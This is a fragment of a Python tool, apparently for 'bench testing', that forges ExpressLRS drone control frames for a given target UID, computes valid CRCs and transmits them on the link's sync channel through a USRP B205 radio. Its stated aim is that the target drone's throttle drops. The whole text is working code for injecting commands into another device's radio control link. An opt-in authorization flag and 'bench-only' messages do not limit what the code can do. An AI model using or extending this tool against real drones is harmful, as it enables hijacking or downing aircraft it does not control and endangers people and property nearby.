    rate = AUTO_RATE if args.rate == "auto" else args.rate
    af = AIR_FORMATS[rate]

    hexs = args.uid.replace(":", "").replace(" ", "")
    uid = bytes(int(hexs[i:i+2], 16) for i in range(0, 12, 2))
    assert len(uid) == 6, "UID must be 6 bytes"

    print(f"=== ELRC bench-test TX ({af.mod.upper()} {af.payload_len}-byte OTA, rate={rate}) ===")
    print(f"  [info] UID {uid.hex(' ')}")
    ok = selftest(uid, air_format=af)
    print(f"selftest: {'PASS' if ok else 'FAIL'}\n")

    # Build the frame for the selected air format
    us_min, us_max = 988, 2012
    thr = args.throttle_us if not args.hold_throttle else 1000  # hold = min mark
    thr11 = constrain(int(round((thr - us_min) * (CRSF_CHANNEL_VALUE_STD_MAX - CRSF_CHANNEL_VALUE_STD_MIN) / (us_max - us_min)) + CRSF_CHANNEL_VALUE_STD_MIN),
                      CRSF_CHANNEL_VALUE_STD_MIN, CRSF_CHANNEL_VALUE_STD_MAX)
    chs4 = [thr11, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID]
    if af.mod == "lora":
        # 13-byte OTA8 full-res: 8 channels (CH0-3 + AUX2-5). The OTA8 layout is
        # CONFIRMED from the vendored ELRS source (see build_rcdata_full_frame
        # docstring), so this is a real RCDATA frame, not a placeholder.
        chs8 = chs4 + [CRSF_CHANNEL_VALUE_MID] * 4
        frame = build_rcdata_full_frame(uid, 0, chs8, is_armed=0)
        crc_ok = validate_rcdata_full_frame(uid, frame, 0)
    else:
        frame = build_rcdata_frame(uid, 0, chs4, is_armed=0)
        crc_ok = validate_rcdata_frame(uid, frame, 0)
    print(f"frame: {frame.hex(' ')} (throttle={thr}us, {len(frame)}B, CRC-valid={crc_ok})")
    print(air_format_summary(af, uid))
    if af.mod == "lora":
        # Build baseband offline so the air path is proven end-to-end even when
        # the TX gate refuses (or uhd is absent). No hardware is touched here.
        iq, dwell = build_baseband_for_frame(uid, frame, 0, sample_rate=2_000_000,
                                             air_format=af)
        print(f"baseband: {len(iq)} samples @ 2 MS/s via RX lora.py modulator "
              f"(offline; dwell {dwell*1000:.1f} ms/frame)")

    if args.selftest:
        return 0 if ok else 1

    # --- GATED TX (only for the GFSK path; the LoRa path's baseband is already
    # built offline above; a hardware emit for it is not yet wired to a demod-
    # compatible stream and would go through tx_frame_b205 like flrc8) ---
    if af.mod == "lora":
        print("\nTX: not emitting. LoRa baseband is built offline (see above); no RF.")
        return 0
    if not args.authorized:
        print("\nREFUSED: TX requires --I-am-authorized-bench-target.")
        print("        Drone must be operator-owned, on the bench, disarmed, grounded.")
        print("        (Frame + baseband built and self-tested offline above.)")
        return 2

    channel = args.channel if args.channel is not None else FHSS_SYNC_CHANNEL
    freq = fhss_channel_to_freq(channel)
    print(f"\n[bench] emitting on FHSS channel {channel} = {freq/1e6:.1f} MHz, {args.repeats} repeats")
    print(f"[bench] (a full FHSS-lock version tracks the target's live hop + nonce; this")
    print(f"[bench]  start-point emits on the sync channel — adjust --channel if the target")
    print(f"[bench]  is hopping elsewhere. Bench-only, grounded drone.)")

    # Emit (requires uhd + B205 TX). If uhd missing, report clearly.
    try:
        import uhd  # noqa
    except ImportError:
        print("  [no TX] uhd not importable in this environment — install UHD + connect the B205,")
        print("  then re-run with --I-am-authorized-bench-target to emit.")
        print("  (The frame + baseband are ready; this is the hardware step.)")
        return 0

    iq, dwell = build_baseband_for_frame(uid, frame, 0, sample_rate=2_000_000,
                                         air_format=af)
    for r in range(args.repeats):
        tx_frame_b205(iq, freq)
        time.sleep(dwell * PAYLOAD_REPEATS)
    print(f"[bench] done ({args.repeats} emissions). Observe the bench drone: throttle should drop.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
